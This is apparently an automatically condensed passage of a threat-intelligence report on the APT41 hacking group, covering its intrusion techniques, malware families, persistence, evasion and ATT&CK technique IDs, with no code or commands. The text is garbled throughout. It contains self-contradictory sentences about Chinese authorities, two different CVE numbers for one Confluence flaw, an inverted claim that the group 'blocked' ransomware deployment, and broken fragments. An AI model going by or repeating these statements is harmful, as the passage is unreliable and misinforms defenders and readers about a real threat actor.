Crime Operation 41, is exemplified by APT 41 . The operations underscore a blurred line between state power and crime that lies at the heart of threat ecosystems . It is also possible that Chinese authorities have simply evaded scrutiny from Chinese authorities .  CVE-2019-3369: Spear-phishing • Stolen credentials • TeamViewer INITIAL COMPROMISE • ADORE.XSEC • CROSSWALK.BIN • FRONTWHEEL • HIGHNOON.LINUX • PACMAN • PHOTO • POISONPLUG • POWERSPLOIT • ROCKBOOT • SOGU • Scheduled tasks • Startup ﬁles • Sticky Keys Vulnerability .  APT41 leverages a variety of techniques to perform an initial compromise, including spear-phishing, moving laterally from trusted third parties, leveraging stolen credentials, using the CHINACHOP web shell, and accessing victim organizations using remote desktop sharing software such as TeamViewer . In a campaign running almost one year, APT 41 compromised hundreds of systems and used close to 150 unique pieces of malware .  APT41 was observed using proof- of-concept exploit code for CVE-2019-3396 within 23 days after the Confluence vulnerability was announced . The group has leveraged several exploits in their operations, including the CROSSWALK backdoor .  APT41 uses a variety of malware and tools, both public and unique to the group, to establish a foothold with a victim's environment . The group often initially installs its backdoors to c:\\windows\\temp. a client environment. The group has been observed using Linux and Windows variants of the same malware families .  APT41 escalates its privileges in systems by leveraging custom-made and publicly available tools to gather credentials and dump password hashes . The group also leverages the Sticky Keys vulnerability and PowerShell to deploy malware families in victims' environments . The tools include ACEHASH, GEARSHIFT, GOODLUCK, Mimikatz and NTDSDump .  SOGU, HIGHNOON, and WIDETONE can collect host information by enumerating active Remote Desktop Protocol (RDP) sessions . HighNOON is capable of conducting port scans and password brute-force attacks and collecting network information . Report: APT41 assesses network architecture of an organization and identifies pivotal systems for enabling further access .  APT41 frequently uses the publicly available utility WMIEXEC to move laterally across an environment . Hundreds of systems across several geographic regions were compromised in as little as two weeks . The group will also use a compromised account to create scheduled tasks on systems or modify legitimate Windows services to install the HIGHNOON and SOGU backdoors .  APT41 relies on backdoors, a Sticky Keys vulnerability, scheduled tasks, bootkits, rootkits and registry modifications to maintain presence . The malware was designed to be difficult to detect and prevent . The bootkit performs raw disk operations to bypass the typical MBR boot sequence and execute backdoors prior to the host operating system .  APT41 leveraged ADORE.XSEC, a Linux backdoor launched by the Adore-NG rootkit, throughout an organization's Linux environment . The group also uses CROSSWALK.BIN, FRONTWHEEL, HIGHNOON.LINUX, HOMEUNIX, PACMAN to maintain presence .  APT41 has demonstrated it is highly agile, responding quickly to changes in victim environments and incident responder activity . The group registered a new C&C domain, compiled a new SOGU backdoor variant, and deployed the new backdoor to several systems across multiple geographic regions .  APT41 attempted to remove evidence of some of its activity by deleting Bash histories, clearing Windows security and system events, and modifying DNS management to avoid anti-virus detections . Some of the group's POISONPLUG malware samples leverage the Steam Community website associated with Valve .  APT41 blocked victim systems from retrieving anti-virus updates by accessing the DNS management console and implementing a forward lookup on the domain used for updates to the park IP address \"1.1.2.1\" The group also blocked the group policy on deploying the publicly available Ransomware- as-a-Service (RaaS) Encryptor RaaS through group policy .  t1078 valid Accounts t1100 Web Shell Execution t1059 Command-Line Interface t1223 Compiled HTML File t1106 Execution through API t1129 Execution through Module Load t1203 Exploitation for Client Execution . t1061 Graphical User Interface t1170 Mshta t1086 Windows Management Instrumentation Persistence t1015 Accessibility Features t1098 Account Manipulation t1067 Bootkit t1136 Create Account t1038 DLL Search Order Hijacking .

Some of the malware families are shared with other suspected Chinese espionage groups . The malware families contain similarities to each other, such as HighNOON, and YNK JAPAN .  Some of the variants were used by multiple suspected Chinese groups, including APT41 and APT17 . include HIGHNOON.BIN, HighnoON.LITE, HighNOon.CLI, and Highnoon.LINUX . Some of these variants, such as Highnoons.Bin, contain an identical in memory DLL loading function, which can be seen in Figure 20 .
